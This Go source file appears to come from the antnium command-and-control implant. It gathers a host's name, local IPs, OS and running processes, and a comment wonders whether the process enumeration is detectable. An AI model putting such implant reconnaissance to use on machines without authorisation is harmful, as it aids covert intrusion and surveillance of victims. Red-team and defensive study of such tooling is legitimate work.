package client

import (
	"net"
	"os"
	"runtime"

	"github.com/dobin/antnium/pkg/common"
	"github.com/dobin/antnium/pkg/model"
	"github.com/mitchellh/go-ps"
	"github.com/rs/xid"
	log "github.com/sirupsen/logrus"
)

type ClientConfig struct {
	ComputerId string //
	Hostname   string
	LocalIps   []string
	Arch       string
	Processes  []string
}

func MakeClientConfig() ClientConfig {
	// Hostname
	hostname, err := os.Hostname()
	if err != nil {
		log.Error("ClientConfig: hostname from OS failed")
		hostname = "unknown"
	}

	// Local interfaces
	localIps := make([]string, 0)
	ifaces, err := net.Interfaces()
	if err != nil {
		log.Error("ClientConfig: interfaces from OS failed")
	} else {
		for _, i := range ifaces {
			addrs, err := i.Addrs()
			if err != nil {
				log.Error("ClientConfig: local interfaces from OS parsing failed")
				continue
			}
			for _, addr := range addrs {
				var ip net.IP
				switch v := addr.(type) {
				case *net.IPNet:
					ip = v.IP
				case *net.IPAddr:
					ip = v.IP
				}

				// process IP address
				localIps = append(localIps, ip.String())
			}
		}
	}

	// Arch
	arch := "unknown"
	if runtime.GOOS == "windows" {
		arch = "windows"
	} else if runtime.GOOS == "linux" {
		arch = "linux"
	} else if runtime.GOOS == "darwin" {
		arch = "darwin"
	}

	// Process list
	// May be detectable? https://github.com/mitchellh/go-ps
	processList := make([]string, 0)
	processes, err := ps.Processes()
	if err == nil {
		for _, process := range processes {
			processList = append(processList, process.Executable())
		}
	}

	// Env
	//envList := os.Environ()

	// Machine ID
	// https://github.com/denisbrodbeck/machineid

	db := ClientConfig{
		ComputerId: xid.New().String(),
		Hostname:   hostname,
		LocalIps:   localIps,
		Arch:       arch,
		Processes:  processList,
	}
	return db
}

func (c *ClientConfig) MakeClientPacket(packetType string, arguments model.PacketArgument, response model.PacketResponse) *model.Packet {
	packet := model.NewPacket(
		packetType,
		c.ComputerId,
		common.GetRandomPacketId(),
		arguments,
		response,
	)

	return &packet
}
